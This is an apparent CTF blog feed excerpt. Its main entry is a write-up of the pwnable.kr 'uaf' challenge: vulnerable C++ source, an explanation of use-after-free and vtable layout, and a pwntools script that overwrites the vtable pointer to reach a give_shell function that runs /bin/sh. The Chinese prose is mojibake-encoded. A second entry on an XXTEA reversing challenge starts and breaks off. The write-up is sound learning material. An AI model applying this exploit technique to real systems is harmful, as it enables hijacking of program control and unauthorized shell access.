    <content type="html"><![CDATA[<a id="more"></a><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210208131805440.png"></p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">        Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> len;</span><br><span class="line">        <span class="keyword">char</span>* data;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                m-&gt;introduce();</span><br><span class="line">                                w-&gt;introduce();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="keyword">delete</span> m;</span><br><span class="line">                                <span class="keyword">delete</span> w;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ues-After-Free"><a href="#Ues-After-Free" class="headerlink" title="Ues After Free"></a>Ues After Free</h3><p>â€‹        uafçš„åŸç†å…¶å®å¹¶ä¸éš¾æ‡‚ï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ªè¿·é€”æŒ‡é’ˆï¼Œä¹Ÿç§°ä¸ºé‡æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆæ—¶å› ä¸ºåœ¨ä½¿ç”¨ç©åˆ†é…çš„å †ç©ºé—´åæ²¡æœ‰å°†æŒ‡å‘å †çš„æŒ‡é’ˆåˆ¶ç©ºé€ æˆçš„ï¼Œåˆ©ç”¨é‡æŒ‡é’ˆæˆ‘ä»¬å¯ä»¥å‘è¿™å—å †ä¸­å†™å…¥ä¸€äº›ä¸œè¥¿ï¼Œç„¶ååœ¨ç”³è¯·å †ç©ºé—´ï¼Œåœ¨é‡Šæ”¾å®Œåé©¬ä¸Šåˆç”³è¯·ä¼šç”³è¯·åˆ°é‚£æ®µåˆšåˆšé‡Šæ”¾çš„å †ç©ºé—´ã€‚</p><p>è¿™ä¸ªæ˜¯æœ€ç®€å•çš„uafç¨‹åº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p0;</span><br><span class="line">    p0=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);   <span class="comment">//æŒ‡é’ˆp0ç”³è¯·å†…å­˜ï¼›</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p0,<span class="string">&quot;hello&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p0 Addr:%x,%s\n&quot;</span>,p0,p0);      <span class="comment">//æ‰“å°å…¶åœ°å€ä¸å€¼ï¼›</span></span><br><span class="line">    <span class="built_in">free</span>(p0);                             <span class="comment">//é‡Šæ”¾p0ï¼›</span></span><br><span class="line">    <span class="keyword">char</span> *p1;</span><br><span class="line">    p1==(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;word&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1 Addr:%x,%s\n&quot;</span>,p1,p0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-çš„ä¸€äº›çŸ¥è¯†ç‚¹"><a href="#C-çš„ä¸€äº›çŸ¥è¯†ç‚¹" class="headerlink" title="C++çš„ä¸€äº›çŸ¥è¯†ç‚¹"></a>C++çš„ä¸€äº›çŸ¥è¯†ç‚¹</h3><h4 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a><a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E5%9E%8B_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)">å¤šæ€</a></h4><p>â€‹        è¿™ä¸ªæ¦‚å¿µåœ¨åœ¨wikiä¸Šè§£é‡Šå¾—éå¸¸æŠ½è±¡ï¼Œä½†æ˜¯ä¸Šé¢çš„æºç å…¶å®æŒºé€‚åˆæˆ‘ä»¬ç†è§£çš„ï¼ŒManå’ŒWomanéƒ½ç»§æ‰¿äº†Personè¿™ä¸ªç±»ï¼Œintroduceè¿™ä¸ªåŠ¨ä½œæ˜¯æ‰€æœ‰äººéƒ½æœ‰çš„ï¼Œä½†æ˜¯ç»†åˆ†åˆ°Manå’ŒWomanæ—¶ä»–ä»¬ä¹‹é—´çš„introduceåˆä¸ä¸€æ ·äº†ï¼Œè¿™å°±æ˜¯å¤šæ€ã€‚</p><p>â€‹        æˆ‘çš„ç†è§£ä¸ºï¼Œåœ¨äºå‚è€ƒç³»çš„ä¸åŒï¼Œè¿™æ ·å°±å­˜åœ¨å®è§‚ä¸å¾®è§‚çš„åŒºåˆ«ã€‚ã€‚æ€ªå¼‚çš„ç†è§£ã€‚</p><h4 id="è™šè¡¨"><a href="#è™šè¡¨" class="headerlink" title="è™šè¡¨"></a>è™šè¡¨</h4><p>â€‹        c++é¢å‘å¯¹è±¡ç¼–ç¨‹çš„å¤šæ€æ€§éœ€è¦ç”±è™šè¡¨æ¥å®ç°ã€‚</p><p>â€‹        è™šè¡¨é€šä¿—æ¥è®²å°±æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„é‡Œé¢çš„æŒ‡é’ˆæŒ‡å‘äº†ç±»ä¸­çš„è™šå‡½æ•°ï¼Œ<strong>ä½†æ˜¯è™šå‡½æ•°è¡¨å¹¶ä¸å­˜æ”¾åœ¨ç±»ä¸­</strong>ï¼Œç±»ä¸­åªæœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘è™šå‡½æ•°è¡¨ã€‚è€Œåœ¨c++ä¸­åŒä¸€ä¸ªç±»çš„å¯¹è±¡å…±ç”¨ä¸€å¼ è™šè¡¨ã€‚        </p><h4 id="ç±»åœ¨å†…å­˜ä¸­çš„ç»“æ„"><a href="#ç±»åœ¨å†…å­˜ä¸­çš„ç»“æ„" class="headerlink" title="ç±»åœ¨å†…å­˜ä¸­çš„ç»“æ„"></a>ç±»åœ¨å†…å­˜ä¸­çš„ç»“æ„</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------------------+           virtual talbe                                           </span><br><span class="line">+  virtual table pointer +  ----&gt;  +---------------+ </span><br><span class="line">+------------------------+         + func1 pointer +    </span><br><span class="line">+   characteristic _ 1   +         + --------------+</span><br><span class="line">+------------------------+         + func2 pointer +</span><br><span class="line">+   characteristic _ 2   +         +---------------+</span><br><span class="line">+------------------------+         + func3 pointer +</span><br><span class="line">+   characteristic _ 3   +         +---------------+</span><br><span class="line">+------------------------+</span><br><span class="line">+       ...........      +</span><br><span class="line">+------------------------+</span><br><span class="line">+   characteristic _ n   +</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><h3 id="ç¨‹åºåˆ†æåˆ†æ"><a href="#ç¨‹åºåˆ†æåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æåˆ†æ"></a>ç¨‹åºåˆ†æåˆ†æ</h3><ul><li><p>ç¨‹åºå¼€å§‹ç”³è¯·äº†ä¸¤å—å†…å­˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br></pre></td></tr></table></figure></li><li><p>ç”¨æˆ·é€‰æ‹©èœå•ï¼ˆ1.è°ƒç”¨æ–¹æ³•ã€‚2.ç”³è¯·å†…å­˜ï¼Œè¯»å…¥å‚æ•°ã€‚3.é‡Šæ”¾å†…å­˜ï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                               m-&gt;introduce();</span><br><span class="line">                               w-&gt;introduce();</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                               len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                               data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                               read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                               <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                               <span class="keyword">delete</span> m;</span><br><span class="line">                               <span class="keyword">delete</span> w;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç¨‹åºæ²¡æœ‰å¯¹é‡Šæ”¾å†…å­˜åçš„æŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨é‡æŒ‡é’ˆï¼Œè€Œé€‰æ‹©è€Œåˆå¯ä»¥ç”³è¯·å†…å­˜ï¼Œæ»¡è¶³UAFæ¼æ´çš„è§¦å‘æ¡ä»¶ã€‚åˆæ­¥çš„æƒ³æ³•å°±æ˜¯å…ˆ3åœ¨2ï¼ˆå…ˆé‡Šæ”¾åç”³è¯·ï¼‰ï¼Œåœ¨å‘ç”³è¯·çš„ç©ºé—´ä¸­å†™å…¥ä¸œè¥¿ï¼Œç°åœ¨çš„é—®é¢˜æ˜¯å†™ä»€ä¹ˆè¿›å»ã€‚é‡Šæ”¾çš„ç©ºé—´æ˜¯ç±»ï¼Œå†™å…¥çš„æ•°æ®æ”¹å˜çš„æ˜¯ç±»ï¼Œå¦‚æœç±»æœ‰è™šå‡½æ•°ï¼Œé‚£ä¹ˆç±»ç»“æ„çš„å¼€å¤´å°±æ˜¯è™šè¡¨æŒ‡é’ˆã€‚æˆ‘ä»¬æ”¹å˜çš„å°±æ˜¯è™šè¡¨æŒ‡é’ˆï¼Œæ”¹å˜è™šè¡¨æŒ‡é’ˆçš„ä½œç”¨å¯ä»¥é€šè¿‡IDAæŸ¥çœ‹åç¼–è¯‘ä»£ç æ¥å­¦ä¹ </p></li></ul><h4 id="IDAåç¼–è¯‘æ¥ç†è§£è™šå‡½æ•°è¡¨"><a href="#IDAåç¼–è¯‘æ¥ç†è§£è™šå‡½æ•°è¡¨" class="headerlink" title="IDAåç¼–è¯‘æ¥ç†è§£è™šå‡½æ•°è¡¨"></a>IDAåç¼–è¯‘æ¥ç†è§£è™šå‡½æ•°è¡¨</h4><p>è·Ÿè¸ªå˜é‡v12å’Œv13</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205174523338.png"></p><p>ä¸‹é¢è¿™é‡Œæœ‰ç‚¹éš¾çœ‹æ‡‚ï¼Œå¦‚æŒ‡é’ˆæ²¡æœ‰å­¦å¥½çœ‹è¿™ç§ä¸€å®šä¼šçœ‹æ™•ã€‚æˆ‘å°½é‡å†™æ¸…æ¥šä¸€ç‚¹</p><p>é¦–å…ˆè¦æ˜ç™½v12,v13è¿™ä¸¤ä¸ªå˜é‡å­˜æ”¾çš„æ˜¯å¯¹è±¡è™šè¡¨çš„åœ°å€ï¼Œå› ä¸ºä¸¤ä¸ªå˜é‡ç±»å‹å’Œæ“ä½œæ–¹æ³•ä¸€æ ·ï¼Œæˆ‘åªè¯´v12å°±å¯ä»¥äº†</p><ol><li>å°†v12å¼ºè½¬æˆQWORD*ç±»å‹ï¼Œåœ¨å–è¿™ä¸ªåœ°å€ä¸­çš„å€¼ï¼ŒQWORDå 8ä¸ªå­—èŠ‚ï¼Œä¸€æ¬¡å–8ä½ï¼Œå–å‡ºçš„è¿™8ä½å°±æ˜¯è™šè¡¨çš„é¦–åœ°å€</li><li>è™šè¡¨é¦–åœ°å€åŠ +8ï¼Œä»£è¡¨å–è™šè¡¨ä¸­çš„ç¬¬äºŒä¸ªå‡½æ•°æŒ‡é’ˆ</li><li>å°†å‡½æ•°æŒ‡é’ˆèµ‹å€¼ï¼Œåœ¨è°ƒç”¨ï¼Œå‚æ•°å°±æ˜¯å¯¹è±¡æœ¬èº«ï¼ˆthisæŒ‡é’ˆ)ï¼Œå¦‚æœä¸æ‡‚thisæŒ‡é’ˆå»Googleäº†è§£ä¸‹ï¼Œå¾ˆé‡è¦ã€‚</li></ol><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205174708424.png"></p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>â€‹        é€šè¿‡ä¸Šé¢çš„åˆ†æï¼ŒçŸ¥é“äº†è°ƒç”¨è™šå‡½æ•°å…¶å®æ˜¯é€šè¿‡åç§»æ¥å®ç°çš„ï¼Œé€šè¿‡+8å¯ä»¥è°ƒç”¨ç¬¬äºŒä¸ªè™šå‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬å¾—åˆ°äº†è™šå‡½æ•°è¡¨åŸºå€ï¼Œå¹¶ä¸”æ”¹å˜ï¼Œå°±å¯ä»¥æ§åˆ¶å‡½æ•°è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„è™šå‡½æ•°ï¼Œè€Œç¨‹åºä¸ºæˆ‘ä»¬å‡†å¤‡äº†è¿™æ ·ä¸€ä¸ªè™šå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡IDAæŸ¥æ‰¾åˆ°Personå‡½æ•°çš„è™šè¡¨åœ°å€æ˜¯0x0000000000401590ï¼Œå°†è¿™ä¸ªå€¼-8ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨çš„æ—¶å€™å°±åˆšå¥½å¯ä»¥è°ƒç”¨åˆ°give_shellè¿™ä¸ªå‡½æ•°</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205180240856.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æœ¬æœºexpï¼Œè¿œç¨‹å¤±è´¥å¥½åƒæ˜¯æˆ‘æ²¡æœ‰å†™æ–‡ä»¶çš„æƒé™ï¼Ÿ</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">vtable_addr = <span class="number">0x0000000000401550</span></span><br><span class="line">filepath = <span class="string">&#x27;/home/fish/uaf/bash&#x27;</span></span><br><span class="line"><span class="comment">#filepath = &#x27;/tmp/f1sh&#x27;</span></span><br><span class="line">write_stream = p64(vtable_addr - <span class="number">8</span>)</span><br><span class="line"><span class="keyword">with</span> open(filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(write_stream)</span><br><span class="line"></span><br><span class="line">Argv = [<span class="string">&#x27;/home/uaf/uaf&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, filepath]</span><br><span class="line">p = process(executable = <span class="string">&#x27;./uaf&#x27;</span>, argv = Argv )</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯é“¾æ¥ä¸ŠæœåŠ¡å™¨åæ‰‹åŠ¨getshellå¾—åˆ°çš„ç»“æœ</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205224956747.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210208131805440.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;æºç &quot;&gt;&lt;a href=&quot;#æºç </summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>hgame2021-week1</title>
    <link href="http://example.com/2021/02/02/CTF/wp/HGAME/"/>
    <id>http://example.com/2021/02/02/CTF/wp/HGAME/</id>
    <published>2021-02-01T16:55:40.696Z</published>
    <updated>2021-02-05T06:46:20.025Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ä¸€æ¯é˜¿å¸•èŒ¶"><a href="#ä¸€æ¯é˜¿å¸•èŒ¶" class="headerlink" title="ä¸€æ¯é˜¿å¸•èŒ¶"></a>ä¸€æ¯é˜¿å¸•èŒ¶</h3><p>æ˜æ˜¾çš„TEAåŠ å¯†æ ‡å¿—ï¼Œåé¢åˆ†æä¸ºXXTEAåŠ å¯†</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201051733.png"></p><p>åŠ å¯†åçš„æ•°æ®ï¼Œåˆšå¥½35ä½</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201231341.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5 ^ y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3 ^ z&lt;&lt;4)) ^ ((sum ^ y) + (k[(p&amp;3) ^ e] ^ z)))</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XXTEA</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> sum, y, z;</span><br><span class="line"><span class="keyword">uint32_t</span> p, rounds, e;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">rounds = <span 